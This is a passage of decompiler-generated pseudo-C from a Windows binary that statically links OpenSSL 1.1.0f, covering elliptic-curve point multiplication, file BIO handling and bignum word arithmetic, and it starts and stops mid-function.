        *(__int64 *)((char *)v33 + i) = (__int64)v40;
        if ( !v40 )
          goto LABEL_66;
        v41 = v101;
        if ( *v39 > v101 )
          v41 = *v39;
        ++v32;
        v34 = (char *)v99;
        ++v33;
        v101 = v41;
        if ( v32 >= v107 )
        {
          v15 = v95;
          v31 = a4;
          v30 = v102;
          break;
        }
      }
    }
    if ( v12 )
    {
      if ( v14 )
      {
        v99 = 0i64;
        if ( v15 )
        {
          sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 275);
          goto LABEL_66;
        }
        v42 = *(_QWORD *)(v14 + 24);
        *(_QWORD *)&v30[8 * v31] = *(_QWORD *)(v14 + 24);
        v43 = sub_1400751A0(a3, v42, &v99);
        if ( !v43 )
          goto LABEL_66;
        v44 = v99;
        if ( v99 <= v101 )
        {
          v45 = v104;
          v13 = v93;
          v98 = v31 + 1;
          v46 = v103;
          *(_QWORD *)&v104[8 * v31] = v43;
          *(_QWORD *)&v45[8 * v31 + 8] = 0i64;
          *(_QWORD *)&v46[8 * v31] = v44;
          *((_QWORD *)v93 + v31) = *(_QWORD *)(v14 + 32);
          goto LABEL_94;
        }
        v47 = v100;
        if ( v99 >= v100 * v12 )
        {
          v49 = v12 + a4;
        }
        else
        {
          v48 = (v99 + v100 - 1) / v100;
          if ( v48 > *(_QWORD *)(v14 + 16) )
          {
            sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 318);
            sub_14001D930(v43);
            v13 = v93;
            v19 = 0i64;
            goto LABEL_16;
          }
          v49 = v31 + v48;
          v98 = v49;
        }
        v50 = *(_QWORD **)(v14 + 32);
        v51 = v43;
        v52 = v31;
        if ( v31 < v49 )
        {
          v53 = v49 - 1;
          v54 = v104 - v103;
          v96 = v104 - v103;
          v55 = (_BYTE *)v93 - v103;
          v56 = (size_t *)&v103[8 * v31];
          for ( i = v53; ; v53 = i )
          {
            if ( v52 >= v53 )
            {
              *v56 = v44;
            }
            else
            {
              *v56 = v47;
              if ( v44 < v47 )
              {
                sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 333);
                sub_14001D930(v43);
                v13 = v93;
                v19 = 0i64;
                goto LABEL_16;
              }
              v99 = v44 - v47;
            }
            *(size_t *)((char *)v56 + v54 + 8) = 0i64;
            v57 = sub_14001D8E0(*v56);
            *(size_t *)((char *)v56 + v96) = (size_t)v57;
            if ( !v57 )
              break;
            memmove(v57, v51, *v56);
            v58 = v101;
            if ( *v56 > v101 )
              v58 = *v56;
            v101 = v58;
            if ( !*v50 )
            {
              sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 357);
              sub_14001D930(v43);
              v13 = v93;
              v19 = 0i64;
              goto LABEL_16;
            }
            v59 = v111;
            ++v52;
            v47 = v100;
            *(size_t *)((char *)v56 + v55) = (size_t)v50;
            v51 += v47;
            ++v56;
            v50 += v59;
            if ( v52 >= v98 )
              goto LABEL_92;
            v44 = v99;
            v54 = v96;
          }
          sub_140024610(16, 187, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 348);
          sub_14001D930(v43);
          v13 = v93;
          v19 = 0i64;
          goto LABEL_16;
        }
LABEL_92:
        sub_14001D930(v43);
      }
      else if ( v15 != 1 )
      {
        sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 266);
LABEL_66:
        v13 = v93;
        v19 = 0i64;
        goto LABEL_16;
      }
    }
    v13 = v93;
LABEL_94:
    v60 = v108;
    v61 = (void **)sub_14001D8E0(8 * v108 + 8);
    v94 = (__int64)v61;
    v19 = v61;
    if ( !v61 )
    {
      sub_140024610(16, 187, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 377);
      goto LABEL_16;
    }
    v62 = 0i64;
    v63 = &v61[v60];
    v64 = v61;
    *v63 = 0i64;
    if ( v107 )
    {
      v65 = v102;
      v66 = (_BYTE *)v93 - v102;
LABEL_98:
      *(_QWORD *)&v65[v66] = v64;
      v67 = 0i64;
      while ( 1 )
      {
        v68 = sub_140022670((__int64 *)a1);
        *v64 = v68;
        if ( !v68 )
          goto LABEL_104;
        ++v64;
        if ( ++v67 >= (unsigned __int64)(1i64 << (*v65 - 1)) )
        {
          ++v62;
          v65 += 8;
          if ( v62 < v107 )
            goto LABEL_98;
          break;
        }
      }
    }
    if ( v64 != v63 )
    {
      sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 394);
LABEL_104:
      v13 = v93;
      v19 = (void **)v94;
      goto LABEL_16;
    }
    v105 = sub_140022670((__int64 *)a1);
    v69 = v105;
    if ( !v105 )
      goto LABEL_104;
    v70 = v107;
    v71 = 0i64;
    if ( v107 )
    {
      v72 = (_QWORD ***)v93;
      v73 = a5 - (_QWORD)v93;
      v117 = a5 - (_QWORD)v93;
      v74 = (char *)(v102 - (_BYTE *)v93);
      do
      {
        v75 = v71 >= a4 ? v106 : *(struct _xDISPATCHER_CONTEXT **)((char *)v72 + v73);
        if ( !(unsigned int)sub_140022150(**v72, v75) )
          goto LABEL_104;
        if ( *(_QWORD ***)((char *)v72 + (_QWORD)v74) > (_QWORD **)1 )
        {
          if ( !(unsigned int)sub_1400221E0((__int64)a1, v69, **v72) )
            goto LABEL_104;
          v76 = 1i64;
          if ( (unsigned __int64)(1i64 << (*((_BYTE *)v72 + (_QWORD)v74) - 1)) > 1 )
          {
            while ( (unsigned int)sub_140022010((__int64)a1, (*v72)[v76], (*v72)[v76 - 1], v105) )
            {
              if ( ++v76 >= (unsigned __int64)(1i64 << (*((_BYTE *)v72 + (_QWORD)v74) - 1)) )
                goto LABEL_117;
            }
            goto LABEL_104;
          }
LABEL_117:
          v69 = v105;
        }
        v73 = v117;
        ++v71;
        ++v72;
      }
      while ( v71 < v70 );
    }
    v19 = (void **)v94;
    if ( (unsigned int)sub_140022A70((__int64 *)a1, v108, v94) )
    {
      v77 = 1;
      v78 = v101 - 1;
      v97 = v101 - 1;
      if ( (int)v101 - 1 >= 0 )
      {
        v79 = v98;
        v80 = v78;
        v100 = v78;
        do
        {
          v81 = a2;
          if ( !v77 )
          {
            if ( !(unsigned int)sub_1400221E0((__int64)a1, a2, a2) )
              goto LABEL_104;
            v80 = v100;
            v78 = v97;
          }
          v82 = 0i64;
          if ( v79 )
          {
            v83 = v103 - v104;
            v84 = v93;
            v85 = v78;
            v86 = (char *)(v104 - (_BYTE *)v93);
            v106 = (struct _xDISPATCHER_CONTEXT *)v78;
            do
            {
              if ( *(_QWORD *)&v86[(_QWORD)v84 + v83] > v85 )
              {
                v87 = *(char *)(*(_QWORD *)&v86[(_QWORD)v84] + v80);
                if ( v87 )
                {
                  v88 = -v87;
                  v89 = (unsigned int)v87 >> 31;
                  if ( v87 >= 0 )
                    v88 = v87;
                  v90 = v114;
                  if ( v89 != v114 )
                  {
                    if ( !v77 )
                    {
                      if ( !(unsigned int)sub_140022400((__int64)a1, a2) )
                        goto LABEL_104;
                      v90 = v114;
                    }
                    v114 = v90 == 0;
                  }
                  v91 = v88;
                  v81 = a2;
                  v92 = v91 >> 1;
                  if ( v77 )
                  {
                    if ( !(unsigned int)sub_140022150(a2, *(_QWORD **)(*v84 + 8 * v92)) )
                      goto LABEL_104;
                    v77 = 0;
                  }
                  else if ( !(unsigned int)sub_140022010((__int64)a1, a2, a2, *(_QWORD **)(*v84 + 8 * v92)) )
                  {
                    goto LABEL_104;
                  }
                  v85 = (unsigned __int64)v106;
                }
              }
              v80 = v100;
              ++v82;
              ++v84;
            }
            while ( v82 < v98 );
            v78 = v97;
            v79 = v98;
          }
          --v78;
          --v80;
          v97 = v78;
          v100 = v80;
        }
        while ( v78 >= 0 );
        if ( !v77 )
        {
          if ( v114 )
          {
            if ( (unsigned int)sub_140022400((__int64)a1, v81) )
            {
              v19 = (void **)v94;
              v7 = 1;
              v13 = v93;
              goto LABEL_16;
            }
            goto LABEL_104;
          }
LABEL_150:
          v13 = v93;
          v7 = 1;
          v19 = (void **)v94;
          goto LABEL_16;
        }
        v19 = (void **)v94;
      }
      if ( (unsigned int)sub_1400229F0((__int64)a1, a2) )
        goto LABEL_150;
    }
    v13 = v93;
    goto LABEL_16;
  }
  sub_140024610(16, 187, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 183);
LABEL_15:
  v19 = 0i64;
LABEL_16:
  sub_140027BE0((__int64)v109);
  sub_1400222C0(v105);
  sub_14001D930(v102);
  sub_14001D930(v103);
  v20 = v104;
  if ( v104 )
  {
    v21 = *(void **)v104;
    v22 = v104;
    if ( *(_QWORD *)v104 )
    {
      do
      {
        sub_14001D930(v21);
        v21 = (void *)*((_QWORD *)v22 + 1);
        v22 += 8;
      }
      while ( v21 );
    }
    sub_14001D930(v20);
  }
  if ( v19 )
  {
    v23 = *v19;
    for ( j = v19; v23; ++j )
    {
      sub_140022090(v23);
      v23 = j[1];
    }
    sub_14001D930(v19);
  }
  sub_14001D930(v13);
  return v7;
}

//----- (000000014003DA00) ----------------------------------------------------
__int64 *__fastcall sub_14003DA00(__int64 a1, int *a2)
{
  unsigned int v2; // r15d
  _QWORD *v4; // r13
  _QWORD *v5; // r14
  _QWORD **v6; // rdi
  __int64 *result; // rax
  __int64 v9; // rbx
  struct _xDISPATCHER_CONTEXT *v10; // r12
  int *v11; // rax
  __int64 jumpbuf_sp; // rax
  __int64 v13; // rbx
  int v14; // eax
  __int64 v15; // rdx
  unsigned __int64 v16; // r15
  _QWORD **v17; // rax
  __int64 v18; // rbx
  _QWORD *v19; // rax
  _QWORD *v20; // rax
  unsigned __int64 v21; // rbx
  unsigned __int64 v22; // r12
  int v23; // eax
  unsigned __int64 v24; // rbx
  __int64 v25; // rbx
  _QWORD *v26; // rax
  _QWORD **i; // rbx
  __int64 v28; // [rsp+30h] [rbp-58h]
  unsigned __int64 v29; // [rsp+38h] [rbp-50h]
  unsigned __int64 v30; // [rsp+40h] [rbp-48h]
  int *v31; // [rsp+48h] [rbp-40h]
  __int64 *v32; // [rsp+A0h] [rbp+18h]
  __int64 v33; // [rsp+A8h] [rbp+20h]

  v2 = 0;
  v4 = 0i64;
  v31 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  sub_140022B10(a1);
  result = sub_14003CC10(a1);
  v32 = result;
  v9 = (__int64)result;
  if ( !result )
    return result;
  v10 = __FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a1);
  if ( !v10 )
  {
    sub_140024610(16, 188, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 546);
LABEL_50:
    if ( a2 )
      sub_140027B60((__int64)a2);
    v11 = v31;
    goto LABEL_53;
  }
  if ( a2 || (v11 = (int *)sub_140027CD0(), v31 = v11, (a2 = v11) != 0i64) )
  {
    sub_140027D40(a2);
    jumpbuf_sp = _except_get_jumpbuf_sp(a1);
    v13 = jumpbuf_sp;
    if ( jumpbuf_sp )
    {
      if ( sub_140027160(jumpbuf_sp) )
      {
        sub_140024610(16, 188, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 562);
      }
      else
      {
        v14 = sub_140027260(v13);
        v15 = 4i64;
        v28 = 4i64;
        if ( (unsigned __int64)v14 > 0x31F
          || (unsigned __int64)v14 <= 0x45 && 2 - (unsigned __int64)((unsigned __int64)v14 < 0x14) > 4 )
        {
          if ( (unsigned __int64)v14 < 0x7D0 )
          {
            if ( (unsigned __int64)v14 < 0x320 )
            {
              if ( (unsigned __int64)v14 < 0x12C )
              {
                if ( (unsigned __int64)v14 < 0x46 )
                  v15 = 2i64 - ((unsigned __int64)v14 < 0x14);
                else
                  v15 = 3i64;
              }
            }
            else
            {
              v15 = 5i64;
            }
          }
          else
          {
            v15 = 6i64;
          }
          v28 = v15;
        }
        v16 = 1i64 << ((unsigned __int8)v15 - 1);
        v29 = (unsigned __int64)(v14 + 7i64) >> 3;
        v30 = v29 * v16;
        v17 = (_QWORD **)sub_14001D8E0(8 * v29 * v16 + 8);
        v33 = (__int64)v17;
        v6 = v17;
        if ( v17 )
        {
          v17[v29 * v16] = 0i64;
          v18 = 0i64;
          if ( v30 )
          {
            while ( 1 )
            {
              v19 = sub_140022670((__int64 *)a1);
              v6[v18] = v19;
              if ( !v19 )
                break;
              if ( ++v18 >= v30 )
                goto LABEL_26;
            }
            sub_140024610(16, 188, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 598);
          }
          else
          {
LABEL_26:
            v4 = sub_140022670((__int64 *)a1);
            if ( v4 && (v20 = sub_140022670((__int64 *)a1), (v5 = v20) != 0i64) )
            {
              if ( (unsigned int)sub_140022150(v20, v10) )
              {
                v21 = v29;
                v22 = 0i64;
                if ( v29 )
                {
                  while ( (unsigned int)sub_1400221E0(a1, v4, v5) )
                  {
                    v23 = sub_140022150(*v6++, v5);
                    if ( !v23 )
                      break;
                    v24 = 1i64;
                    if ( v16 > 1 )
                    {
                      while ( (unsigned int)sub_140022010(a1, *v6, v4, *(v6 - 1)) )
                      {
                        ++v24;
                        ++v6;
                        if ( v24 >= v16 )
                          goto LABEL_35;
                      }
                      break;
                    }
LABEL_35:
                    v21 = v29;
                    if ( v22 < v29 - 1 )
                    {
                      if ( (unsigned int)sub_1400221E0(a1, v5, v4) )
                      {
                        v25 = 2i64;
                        while ( (unsigned int)sub_1400221E0(a1, v5, v5) )
                        {
                          if ( (unsigned __int64)++v25 >= 8 )
                          {
                            v21 = v29;
                            goto LABEL_41;
                          }
                        }
                      }
                      break;
                    }
LABEL_41:
                    if ( ++v22 >= v21 )
                      goto LABEL_42;
                  }
                  v6 = (_QWORD **)v33;
                }
                else
                {
LABEL_42:
                  v6 = (_QWORD **)v33;
                  if ( (unsigned int)sub_140022A70((__int64 *)a1, v30, v33) )
                  {
                    v32[3] = v28;
                    v32[2] = v21;
                    v9 = 0i64;
                    v32[4] = v33;
                    v6 = 0i64;
                    v32[5] = v30;
                    *v32 = a1;
                    v2 = 1;
                    v32[1] = 8i64;
                    *(_DWORD *)(a1 + 152) = 5;
                    *(_QWORD *)(a1 + 160) = v32;
                    goto LABEL_50;
                  }
                }
              }
            }
            else
            {
              sub_140024610(16, 188, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 605);
            }
          }
        }
        else
        {
          sub_140024610(16, 188, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 590);
        }
        v2 = 0;
      }
    }
    v9 = (__int64)v32;
    goto LABEL_50;
  }
LABEL_53:
  sub_140027BE0((__int64)v11);
  sub_14003CB60(v9);
  if ( v6 )
  {
    v26 = *v6;
    for ( i = v6; v26; ++i )
    {
      sub_1400222C0(v26);
      v26 = i[1];
    }
    sub_14001D930(v6);
  }
  sub_1400222C0(v4);
  sub_1400222C0(v5);
  return (__int64 *)v2;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014003DE80) ----------------------------------------------------
size_t __fastcall sub_14003DE80(__int64 a1, const void *a2, unsigned int a3)
{
  size_t result; // rax

  if ( !*(_DWORD *)(a1 + 24) || !a2 )
    return 0i64;
  result = fwrite(a2, (int)a3, 1ui64, *(FILE **)(a1 + 48));
  if ( (_DWORD)result )
    return a3;
  return result;
}

//----- (000000014003DED0) ----------------------------------------------------
__int64 __fastcall sub_14003DED0(__int64 a1, void *a2, int a3)
{
  unsigned int v4; // edi
  __int16 LastError; // ax

  if ( !*(_DWORD *)(a1 + 24) || !a2 )
    return 0i64;
  v4 = fread(a2, 1ui64, a3, *(FILE **)(a1 + 48));
  if ( !ferror(*(FILE **)(a1 + 48)) )
    return v4;
  LastError = GetLastError();
  sub_140024610(2, 11, LastError, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 154);
  sub_140024610(32, 130, 2, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 155);
  return 0xFFFFFFFFi64;
}

//----- (000000014003DF90) ----------------------------------------------------
size_t __fastcall sub_14003DF90(__int64 a1, _BYTE *a2)
{
  unsigned int v2; // ebx
  _BYTE *i; // rax
  unsigned int v4; // ebx
  size_t result; // rax

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  v4 = v2 & 0x7FFFFFFF;
  if ( !*(_DWORD *)(a1 + 24) )
    return 0i64;
  result = fwrite(a2, v4, 1ui64, *(FILE **)(a1 + 48));
  if ( (_DWORD)result )
    return v4;
  return result;
}

//----- (000000014003E000) ----------------------------------------------------
__int64 __fastcall sub_14003E000(__int64 a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // rdi
  unsigned int v4; // ebx

  v3 = a2;
  v4 = 0;
  *a2 = 0;
  if ( common_fgets<char>(a2, a3, *(_QWORD *)(a1 + 48)) && *v3 )
  {
    do
    {
      if ( v4 >= 0x80000000 )
        break;
      ++v3;
      ++v4;
    }
    while ( *v3 );
    v4 &= ~0x80000000;
  }
  return v4;
}
// 14000D01C: using guessed type __int64 __fastcall common_fgets<char>(_QWORD, _QWORD, _QWORD);

//----- (000000014003E060) ----------------------------------------------------
__int64 __fastcall sub_14003E060(__int64 a1, int a2, int a3, FILE *a4)
{
  int v4; // eax
  unsigned int v5; // ebx
  FILE *v7; // rcx
  int v10; // ecx
  char *v11; // rdx
  __int16 *v12; // rcx
  bool v13; // zf
  __int16 v14; // ax
  FILE *v15; // rax
  __int16 v16; // ax
  __int16 v17; // r8
  __int16 LastError; // ax
  __int64 v20; // [rsp+0h] [rbp-38h] BYREF
  __int64 v21; // [rsp+20h] [rbp-18h]
  char v22; // [rsp+48h] [rbp+10h] BYREF

  v5 = v4 - 47;
  v7 = *(FILE **)(a1 + 48);
  switch ( a2 )
  {
    case 1:
    case 128:
      return (unsigned int)fseek(v7, a3, 0);
    case 2:
      return (unsigned int)feof(v7);
    case 3:
    case 133:
      return (unsigned int)common_ftell<long>(v7);
    case 8:
      return *(unsigned int *)(a1 + 28);
    case 9:
      *(_DWORD *)(a1 + 28) = a3;
      return v5;
    case 11:
      if ( fflush(v7) == -1 )
      {
        LastError = GetLastError();
        sub_140024610(2, 18, LastError, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 320);
        sub_140023A40(v5, "fflush()");
        LODWORD(v21) = 322;
        goto LABEL_33;
      }
      return v5;
    case 12:
      return v5;
    case 106:
      sub_14003E3E0(a1);
      *(_QWORD *)(a1 + 48) = a4;
      *(_DWORD *)(a1 + 24) = v5;
      *(_DWORD *)(a1 + 28) = v5 & a3;
      v10 = fileno(a4);
      if ( (a3 & 0x10) != 0 )
        setmode(v10, 0x4000);
      else
        setmode(v10, 0x8000);
      return v5;
    case 107:
      if ( a4 )
        a4->_ptr = (char *)v7;
      return v5;
    case 108:
      sub_14003E3E0(a1);
      *(_DWORD *)(a1 + 28) = v5 & a3;
      if ( (a3 & 8) != 0 )
      {
        if ( (a3 & 2) != 0 )
          v11 = "a+";
        else
          v11 = "a";
      }
      else if ( (a3 & 6) == 6 )
      {
        v11 = "r+";
      }
      else if ( (a3 & 4) != 0 )
      {
        v11 = "w";
      }
      else
      {
        if ( (a3 & 2) == 0 )
        {
          LODWORD(v21) = 280;
          v17 = 101;
LABEL_34:
          sub_140024610(32, 116, v17, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", v21);
          return 0;
        }
        v11 = "r";
      }
      sub_14003C060(&v22, v11, 4ui64);
      v12 = (__int16 *)((char *)&v20 + 71);
      if ( (a3 & 0x10) != 0 )
      {
        do
        {
          v13 = *((_BYTE *)v12 + 1) == 0;
          v12 = (__int16 *)((char *)v12 + 1);
        }
        while ( !v13 );
        v14 = 116;
      }
      else
      {
        do
        {
          v13 = *((_BYTE *)v12 + 1) == 0;
          v12 = (__int16 *)((char *)v12 + 1);
        }
        while ( !v13 );
        v14 = 98;
      }
      *v12 = v14;
      v15 = sub_140075410((const CHAR *)a4, &v22);
      if ( !v15 )
      {
        v16 = GetLastError();
        sub_140024610(2, v5, v16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 292);
        sub_140023A40(5, "fopen('", a4, "','", &v22, "')");
        LODWORD(v21) = 294;
LABEL_33:
        v17 = 2;
        goto LABEL_34;
      }
      *(_QWORD *)(a1 + 48) = v15;
      *(_DWORD *)(a1 + 24) = v5;
      sub_140029A60(a1, 0);
      return v5;
    default:
      return 0;
  }
}
// 14003E080: variable 'v4' is possibly undefined
// 140006148: using guessed type __int64 __fastcall common_ftell<long>(_QWORD);

//----- (000000014003E3C0) ----------------------------------------------------
__int64 __fastcall sub_14003E3C0(__int64 a1)
{
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_DWORD *)(a1 + 32) = 0;
  return 1i64;
}

//----- (000000014003E3E0) ----------------------------------------------------
__int64 __fastcall sub_14003E3E0(__int64 a1)
{
  FILE *v3; // rcx

  if ( !a1 )
    return 0i64;
  if ( *(_DWORD *)(a1 + 28) )
  {
    if ( *(_DWORD *)(a1 + 24) )
    {
      v3 = *(FILE **)(a1 + 48);
      if ( v3 )
      {
        fclose(v3);
        *(_QWORD *)(a1 + 48) = 0i64;
        *(_DWORD *)(a1 + 32) = 0;
      }
    }
    *(_DWORD *)(a1 + 24) = 0;
  }
  return 1i64;
}

//----- (000000014003E440) ----------------------------------------------------
__int64 *__fastcall sub_14003E440(const CHAR *a1, const char *a2)
{
  FILE *v4; // rdi
  unsigned int v5; // esi
  DWORD LastError; // eax
  __int64 *v8; // rax
  __int64 *v9; // rbx

  v4 = sub_140075410(a1, a2);
  v5 = 1;
  if ( !strchr(a2, 98) )
    v5 = 17;
  if ( v4 )
  {
    v8 = sub_140029FE0((__int64)&unk_1400F6430);
    v9 = v8;
    if ( v8 )
    {
      sub_140029A60((__int64)v8, 0);
      sub_140029A90(v9, 0x6Au, v5, (__int64)v4);
      return v9;
    }
    else
    {
      fclose(v4);
      return 0i64;
    }
  }
  else
  {
    LastError = GetLastError();
    sub_140024610(2, 1, LastError, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 74);
    sub_140023A40(5, "fopen('", a1, "','", a2, "')");
    if ( *errno() == 2 || *errno() == 6 )
      sub_140024610(32, 109, 128, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 81);
    else
      sub_140024610(32, 109, 2, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bss_file.c", 83);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014003E580) ----------------------------------------------------
__int64 *__fastcall sub_14003E580(__int64 a1, unsigned int a2)
{
  __int64 *result; // rax
  __int64 *v5; // rbx

  result = sub_140029FE0((__int64)&unk_1400F6430);
  v5 = result;
  if ( result )
  {
    sub_14002A400((__int64)result, 0);
    sub_140029A90(v5, 0x6Au, a2, a1);
    return v5;
  }
  return result;
}

//----- (000000014003E600) ----------------------------------------------------
__int64 __fastcall sub_14003E600(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 result; // rax
  int v5; // ebp
  unsigned int v6; // edi
  __int64 v7; // r9
  int v8; // esi
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rdx
  int v11; // edx
  __int64 v12; // rax

  v2 = a2;
  if ( !a2 )
    return 1i64;
  if ( sub_140027160(a1) )
    return sub_140027560(a1, v2);
  v5 = 0;
  if ( *(_DWORD *)(a1 + 16) )
  {
    *(_DWORD *)(a1 + 16) = 0;
    v6 = sub_14003E980(a1, v2);
    if ( !sub_140027160(a1) )
    {
      LOBYTE(v5) = *(_DWORD *)(a1 + 16) == 0;
      *(_DWORD *)(a1 + 16) = v5;
    }
    return v6;
  }
  else
  {
    v7 = 0i64;
    v8 = 0;
    do
    {
      v9 = v2;
      if ( v8 >= *(_DWORD *)(a1 + 8) )
        break;
      v10 = v2 + *(_QWORD *)(*(_QWORD *)a1 + v7);
      *(_QWORD *)(*(_QWORD *)a1 + v7) = v10;
      ++v8;
      v7 += 8i64;
      v2 = v2 > v10;
    }
    while ( v9 > v10 );
    if ( v2 )
    {
      v11 = *(_DWORD *)(a1 + 8);
      if ( v8 == v11 )
      {
        result = (__int64)sub_140027B30(a1, v11 + 1);
        if ( !result )
          return result;
        v12 = *(_QWORD *)a1;
        ++*(_DWORD *)(a1 + 8);
        *(_QWORD *)(v12 + 8i64 * v8) = v2;
      }
    }
    return 1i64;
  }
}

//----- (000000014003E710) ----------------------------------------------------
__int64 __fastcall sub_14003E710(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  int v6; // eax
  char v7; // r15
  unsigned __int64 v8; // rbp
  int v9; // eax
  __int64 i; // r14
  unsigned __int64 v11; // rbx
  __int64 v12; // rax
  int v13; // eax
  unsigned __int64 v14; // rsi

  v2 = 0i64;
  if ( !a2 )
    return -1i64;
  if ( !*(_DWORD *)(a1 + 8) )
    return 0i64;
  v6 = sub_1400272A0(a2);
  v7 = 64 - v6;
  v8 = a2 << (64 - (unsigned __int8)v6);
  if ( !(unsigned int)sub_140046E40(a1, (__int64 *)a1, 64 - v6) )
    return -1i64;
  v9 = *(_DWORD *)(a1 + 8) - 1;
  for ( i = v9; i >= 0; *(_QWORD *)(*(_QWORD *)a1 + 8 * i--) = v12 )
  {
    v11 = *(_QWORD *)(*(_QWORD *)a1 + 8 * i);
    v12 = sub_1400709C0(v2, v11, v8);
    v2 = v11 - v8 * v12;
  }
  v13 = *(_DWORD *)(a1 + 8);
  if ( v13 > 0 && !*(_QWORD *)(*(_QWORD *)a1 + 8i64 * (v13 - 1)) )
    *(_DWORD *)(a1 + 8) = v13 - 1;
  v14 = v2 >> v7;
  if ( !*(_DWORD *)(a1 + 8) )
    *(_DWORD *)(a1 + 16) = 0;
  return v14;
}

//----- (000000014003E820) ----------------------------------------------------
__int64 __fastcall sub_14003E820(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // rdx
  _DWORD *v5; // rax
  _DWORD *v6; // rdi
  __int64 v7; // rbx
  int v8; // r8d
  unsigned __int64 *v9; // r9
  unsigned __int64 v10; // rcx

  v3 = 0i64;
  if ( !a2 )
    return -1i64;
  if ( a2 <= 0x100000000i64 )
  {
    v8 = *(_DWORD *)(a1 + 8) - 1;
    if ( v8 >= 0 )
    {
      v9 = (unsigned __int64 *)(*(_QWORD *)a1 + 8i64 * v8);
      do
      {
        v10 = *v9--;
        v3 = ((unsigned int)v10 | ((((v3 << 32) | HIDWORD(v10)) % a2) << 32)) % a2;
        --v8;
      }
      while ( v8 >= 0 );
    }
    return v3;
  }
  else
  {
    v5 = sub_140026F70(a1);
    v6 = v5;
    if ( v5 )
    {
      v7 = sub_14003E710((__int64)v5, a2);
      sub_140026FF0(v6);
      return v7;
    }
    else
    {
      return -1i64;
    }
  }
}

//----- (000000014003E8F0) ----------------------------------------------------
__int64 __fastcall sub_14003E8F0(__int64 a1, unsigned __int64 a2)
{
  int v2; // r8d
  __int64 result; // rax
  unsigned __int64 v5; // rdi

  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 )
  {
    if ( !a2 )
    {
      sub_140027560(a1, 0i64);
      return 1i64;
    }
    v5 = sub_140073520(*(char **)a1, *(char **)a1, v2, a2);
    if ( v5 )
    {
      result = (__int64)sub_140027B30(a1, *(_DWORD *)(a1 + 8) + 1);
      if ( !result )
        return result;
      *(_QWORD *)(*(_QWORD *)a1 + 8i64 * (int)(*(_DWORD *)(a1 + 8))++) = v5;
    }
  }
  return 1i64;
}

//----- (000000014003E980) ----------------------------------------------------
__int64 __fastcall sub_14003E980(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  unsigned int v4; // edi
  __int64 result; // rax
  unsigned __int64 v6; // rcx
  int v7; // edx
  __int64 v8; // rcx
  __int64 v9; // r8
  __int64 v10; // rcx
  int v11; // eax

  v2 = a2;
  if ( !a2 )
    return 1i64;
  if ( !sub_140027160(a1) )
  {
    if ( *(_DWORD *)(a1 + 16) )
    {
      *(_DWORD *)(a1 + 16) = 0;
      result = sub_14003E600(a1, v2);
      *(_DWORD *)(a1 + 16) = 1;
      return result;
    }
    if ( *(_DWORD *)(a1 + 8) == 1 )
    {
      v6 = **(_QWORD **)a1;
      if ( v6 < v2 )
      {
        **(_QWORD **)a1 = v2 - v6;
        result = 1i64;
        *(_DWORD *)(a1 + 16) = 1;
        return result;
      }
    }
    v7 = 0;
    if ( **(_QWORD **)a1 < v2 )
    {
      v8 = 0i64;
      v9 = 0i64;
      do
      {
        ++v8;
        ++v7;
        *(_QWORD *)(*(_QWORD *)a1 + v9) -= v2;
        v2 = 1i64;
        v9 = 8 * v8;
      }
      while ( !*(_QWORD *)(8 * v8 + *(_QWORD *)a1) );
    }
    v10 = 8i64 * v7;
    *(_QWORD *)(v10 + *(_QWORD *)a1) -= v2;
    if ( !*(_QWORD *)(v10 + *(_QWORD *)a1) )
    {
      v11 = *(_DWORD *)(a1 + 8) - 1;
      if ( v7 == v11 )
        *(_DWORD *)(a1 + 8) = v11;
    }
    return 1i64;
  }
  v4 = sub_140027560(a1, v2);
  if ( v4 )
    sub_140027540(a1, 1);
  return v4;
